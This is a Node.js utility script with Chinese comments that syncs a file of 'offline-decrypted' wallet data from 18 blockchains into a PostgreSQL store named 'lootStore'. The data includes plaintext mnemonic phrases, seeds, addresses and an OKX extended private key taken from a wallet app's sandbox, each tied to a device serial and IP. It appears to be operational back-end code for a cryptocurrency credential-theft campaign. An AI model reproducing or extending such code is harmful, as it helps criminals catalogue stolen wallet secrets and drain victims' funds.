#!/usr/bin/env node
/**
 * pg_sync_wallet18.js —— 18 链离线解密产物（adm888app/data/wallet18.json）同步进 PG
 * 背景：wallet18 注入发生在 lootStore.scan() 的【全局阶段】；ingestd/backfill 走【桶级 processBucket】
 *   不经过它 → PG 缺"18链离线解密"的 mnemonics/seeds/addresses（对账实测 addresses/助记词缺口）。
 * 逻辑与 lootStore.js scan() 注入段对齐（4 类：mnemonic+seed / keystore 地址 / OKX / adapters）。
 * 幂等：PG ukey（内容哈希）ON CONFLICT DO NOTHING；重复运行安全。
 * 用法: node tools/pg_sync_wallet18.js
 */
const fs = require('fs');
const path = require('path');
const BASE = path.resolve(__dirname, '..');
const ls = require(path.join(BASE, 'adm888app', 'lootStore.js'));            // 复用 abbr
const pgStore = require(path.join(BASE, 'adm888app', 'pg', 'pgStore.js'));
const WF = path.join(BASE, 'adm888app', 'data', 'wallet18.json');

(async () => {
  const wj = JSON.parse(fs.readFileSync(WF, 'utf8'));
  const ipMap = new Map();
  try {
    const r = await pgStore.pool.query('SELECT serial, host(ip) AS ip FROM devices WHERE ip IS NOT NULL');
    for (const x of r.rows) ipMap.set(x.serial, x.ip);
  } catch { /* 无 ip 映射也能跑（ip 留空） */ }

  const now = Date.now();
  const mnemonics = [], seeds = [], addresses = [];
  for (const serial of Object.keys(wj)) {
    const e = wj[serial] || {};
    const dip = ipMap.get(serial) || '';
    const seenM = new Set();      // 同一 serial 内 mnemonic 去重
    const seenA = new Set();      // 同一 serial 内 public_key 去重（跨来源，对齐 lootStore 语义）
    for (const w of (e.wallets || [])) {
      const mnem = String(w.mnemonic || '');
      const appType = String(w.app || '未知');
      if (mnem && !seenM.has(mnem)) {
        seenM.add(mnem);
        mnemonics.push({ id: 0, user_id: 0, serial, mnem_phrase_abbr: ls.abbr(mnem, 3, 4), mnem_phrase_plain: mnem,
          app_type: appType, bundle_id: String(w.bundle || ''), created_at: w.ts || now, ip: dip,
          src: '18chain', note: '18链离线解密（' + String(w.src || '') + '）' });
        seeds.push({ id: 0, user_id: 0, serial, seed_abbr: ls.abbr(mnem, 3, 4), app_type: appType,
          mnemonic_id: null, account_derived_to: 0, created_at: w.ts || now });
      }
      for (const a of (w.addresses || [])) {
        if (!a || !a.addr) continue;
        const key = serial + '|' + a.addr;
        if (seenA.has(key)) continue;
        seenA.add(key);
        const coin = a.coin;
        addresses.push({ id: 0, user_id: 0, serial, public_key: a.addr, public_key_abbr: ls.abbr(a.addr, 8, 6),
          private_key_plain: null, chain: coin === 0 ? 'BTC' : coin === 60 ? 'ETH' : (coin === null || coin === undefined ? appType : 'coin' + coin),
          coin: coin, derivation_path: a.path || '', wallet_name: appType, password_hint: '',
          keystore_id: String(w.keystore_id || ''), fingerprint: '', src: '18chain-keystore', ts: w.ts || now, ip: dip });
      }
    }
    // OKX：账户密钥对（明文 xpriv）+ 各链地址
    const okx = e.okx;
    if (okx && okx.xpriv) {
      const key0 = serial + '|' + okx.xpriv;
      if (!seenA.has(key0)) {
        seenA.add(key0);
        addresses.push({ id: 0, user_id: 0, serial, public_key: 'xpub:' + (okx.xpub || ''),
          public_key_abbr: ls.abbr(okx.xpub || '', 8, 6), private_key_plain: okx.xpriv, private_key_abbr: ls.abbr(okx.xpriv, 6, 6),
          chain: 'OKX账户密钥(非地址私钥)', coin: null, derivation_path: '', wallet_name: 'OKX ' + String(okx.name || ''),
          password_hint: '', keystore_id: '', fingerprint: '', src: '18chain:okx-account',
          note: 'OKX 沙盒 Documents/wallet 里 wallet.xpriv 的明文密钥对（secp256k1 自洽）。⚠️ 非地址级私钥。',
          ts: okx.createAt || now, ip: dip });
      }
      for (const a of (okx.addresses || [])) {
        if (!a.address) continue;
        const key = serial + '|' + a.address;
        if (seenA.has(key)) continue;
        seenA.add(key);
        addresses.push({ id: 0, user_id: 0, serial, public_key: a.address, public_key_abbr: ls.abbr(a.address, 8, 6),
          private_key_plain: null, private_key_abbr: null, chain: 'OKX-' + String(a.chain || ''), coin: a.chainId,
          derivation_path: '', wallet_name: 'OKX ' + String(okx.name || ''), password_hint: '', keystore_id: '',
          fingerprint: '', pubkey: String(a.publicKey || ''), src: '18chain:okx-address', ts: now, ip: dip });
      }
    }
    // adapters（MetaMask / Bitget 等明文地址）
    for (const ad of (e.adapters || [])) {
      for (const x of (ad.addresses || [])) {
        if (!x || !x.address) continue;
        const key = serial + '|' + x.address;
        if (seenA.has(key)) continue;
        seenA.add(key);
        addresses.push({ id: 0, user_id: 0, serial, public_key: x.address, public_key_abbr: ls.abbr(x.address, 8, 6),
          private_key_plain: null, private_key_abbr: null,
          chain: String(ad.app || '') + (x.label && x.label !== ad.app ? ' ' + x.label : ''),
          coin: null, derivation_path: String(x.path || ''), wallet_name: String(ad.app || ''), password_hint: '',
          keystore_id: '', fingerprint: '', src: '18chain:adapter', ts: now, ip: dip });
      }
    }
  }
  const counts = await pgStore.upsertRecords({ mnemonics, seeds, addresses });
  console.log(`[wallet18] 构造 mnemonics=${mnemonics.length} seeds=${seeds.length} addresses=${addresses.length}`);
  console.log(`[wallet18] 入库 recs=${counts.recs} ins=${counts.ins} byTable=${JSON.stringify(counts.byTable)}`);
  await pgStore.close();
})().catch(e => { console.error('[wallet18] fatal', e); process.exit(1); });
